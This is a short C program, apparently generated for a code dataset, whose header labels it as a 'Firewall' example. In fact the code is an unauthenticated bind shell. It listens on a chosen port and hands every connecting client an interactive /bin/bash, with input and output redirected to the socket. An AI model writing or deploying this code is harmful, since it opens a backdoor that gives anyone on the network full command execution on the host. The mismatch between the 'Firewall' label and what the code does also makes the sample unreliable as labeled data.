//Falcon-180B DATASET v1.0 Category: Firewall ; Style: multivariable
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/wait.h>

#define MAX_LINE 1024
#define BACKLOG 5

int main(int argc, char *argv[]) {
    int listen_fd, conn_fd, addrlen, new_socket;
    struct sockaddr_in serv_addr, cli_addr;
    char buffer[MAX_LINE];
    pid_t childpid;

    if (argc!= 2) {
        fprintf(stderr, "Usage: %s <port>\n", argv[0]);
        exit(1);
    }

    listen_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (listen_fd == -1) {
        perror("socket failed");
        exit(1);
    }

    bzero(&serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(atoi(argv[1]));

    if (bind(listen_fd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("bind failed");
        exit(1);
    }

    if (listen(listen_fd, BACKLOG) < 0) {
        perror("listen");
        exit(1);
    }

    addrlen = sizeof(cli_addr);
    while (1) {
        conn_fd = accept(listen_fd, (struct sockaddr *)&cli_addr, &addrlen);
        if (conn_fd < 0) {
            perror("accept");
            continue;
        }

        printf("Connection from %s:%d\n", inet_ntoa(cli_addr.sin_addr), ntohs(cli_addr.sin_port));

        childpid = fork();
        if (childpid < 0) {
            perror("fork");
            exit(1);
        } else if (childpid == 0) {
            close(listen_fd);
            dup2(conn_fd, 0);
            dup2(conn_fd, 1);
            dup2(conn_fd, 2);
            execl("/bin/bash", "bash", NULL);
            perror("execl");
            exit(1);
        } else {
            close(conn_fd);
        }
    }

    return 0;
}